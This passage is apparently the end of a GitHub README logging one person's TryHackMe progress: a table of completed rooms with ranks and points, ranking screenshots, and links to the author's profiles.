|4       |Medium 🚩 - Frank & Herby make an app  | 516    |     105ᵗʰ    |      4ᵗʰ     |     233ʳᵈ    |     3ʳᵈ    | 128,871  |    989    |    76     |
|4       |Info ℹ️ - OverlayFS - CVE-2021-3493    | 516    |     105ᵗʰ    |      4ᵗʰ     |     235ᵗʰ    |     3ʳᵈ    | 128,841  |    988    |    76     |
|3       |Medium 🚩 - XDR: Operation Global Dagger2| 515  |     104ᵗʰ    |      4ᵗʰ     |     149ᵗʰ    |     3ʳᵈ    | 128,833  |    987    |    76     |
|3       |Medium 🚩 - VulnNet: dotpy             | 515    |     108ᵗʰ    |      4ᵗʰ     |     741ˢᵗ    |    11ˢᵗ    | 128,563  |    986    |    76     |
|2       |Medium 🔗 - Data Exfiltration Detection| 514    |     108ᵗʰ    |      4ᵗʰ     |     521ˢᵗ    |     8ᵗʰ    | 128,503  |    985    |    76     |
|1       |Medium 🔗 - Network Discovery Detection| 513    |     108ᵗʰ    |      4ᵗʰ     |     875ᵗʰ    |     7ᵗʰ    | 128,407  |    984    |    76     |
|1       |Medium 🚩 - Intranet                   | 513    |     108ᵗʰ    |      4ᵗʰ     |    3,357ᵗʰ   |    57ᵗʰ    | 128,335  |    983    |    76     |

</h6></div>

<br>

<p align="center">Global All Time:    87ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/21ba5781-3ab7-46f3-8720-1b6f11d3b6b8"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/c2a3cf12-cf1e-407a-a3ad-595e2655fa97"><br><br>
                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/0c8d55c7-f764-4c56-b786-53774b8bb241"><br>
                  Global monthly:     81ˢᵗ<br><img width="1200px" src="https://github.com/user-attachments/assets/5b416a9e-dc8f-4173-a46e-c0863367a627"><br>
                  Brazil monthly:      2ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/67fbd9ec-898b-46a1-80b9-0d051ecf5919"></p>


<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
